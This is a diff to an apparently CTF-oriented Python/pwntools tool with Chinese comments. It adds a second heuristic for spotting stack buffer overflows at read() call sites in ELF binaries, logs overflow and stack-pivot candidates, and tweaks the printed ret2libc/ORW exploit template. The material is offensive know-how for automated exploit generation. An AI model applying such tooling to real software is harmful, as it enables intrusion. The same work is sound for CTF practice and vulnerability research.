@@ -754,6 +754,41 @@ def search_call_what(elf,file_name): #库函数调用地址寻找，危险函数
 		ret2libc_orw(file_name,file_os)
 	if len(stack_migration_addr):#栈迁移构造，暂时只做了getshell的模板，后续开启ORW操作模板自动化生成
 		stack_migration(file_name,file_os)
+def check_read_overflow_small_2(elf,call_addr): #和上面的小数组判断基本上同理
+    #大数组与0x100000000作差
+	rsi=u64(elf.read(int(call_addr-0x14),7)[3:].ljust(8,'\x00'))
+	rsi_size=0x100000000-rsi
+
+	rdx=u64(elf.read(int(call_addr-0xD),5)[1:].ljust(8,'\x00'))
+	rdx_size=rdx
+	
+	print(hex(rdx_size))
+	print(hex(rsi))
+
+	if rdx_size>rsi_size:
+		print("[+]"+hex(call_addr)+" buf_size : "+hex(rsi_size))
+		print("[+]"+hex(call_addr)+" able_input_size : "+hex(rdx_size))
+		print("[+]have stackoverflow!")
+		stackoverflow_addr.append(call_addr)
+		stackoverflow_size.append(rsi_size+8)
+		stackoverflow_input_size.append(rdx_size)
+		if 0x10<=rdx_size-rsi_size<=0x20:
+			stack_migration_addr.append(call_addr-0x19)
+			stack_migration_size.append(rsi_size)
+		if rdx_size>0x10000:
+			stackoverflow_addr.pop()
+			stackoverflow_size.pop()
+			stackoverflow_input_size.pop()
+			if len(stack_migration_addr):
+				stack_migration_addr.pop()
+				stack_migration_size.pop()
+			print("[+]waring: this is maybe an error check,we can not solve it!")
+
+		else:
+			print("")
+
+	else:
+		print("")
 def check_read_overflow_small(elf,call_addr):
     #小数组栈溢出检测长度小于0x80而且是与0x100作差形成一个相对值赋予的，利用公式简单计算就可以得到rsi大小，rdx大小直接获取，没有进行作差计算
 	rsi=u64(elf.read(int(call_addr-0x16),4)[3:].ljust(8,'\x00'))
@@ -781,7 +816,8 @@ def check_read_overflow_small(elf,call_addr):
 			if len(stack_migration_addr):
 				stack_migration_addr.pop()
 				stack_migration_size.pop()
-			print("[+]waring: this is maybe an error check,just like get value from bss.")
+			print("[+]waring: this is maybe an error check,just like get value from bss.Now we use other check")
+			check_read_overflow_small_2(elf,call_addr)
 		else:
 			print("")
 
@@ -978,6 +1014,7 @@ def ret2libc_orw(file_name,file_os):
 					print("puts=base+libc.sym['puts']")
 					print(payload3)
 					print("r.send(payload3)")
+					print("raw_input()")
 					print("r.send('flag')")
 
 					print(payload2)
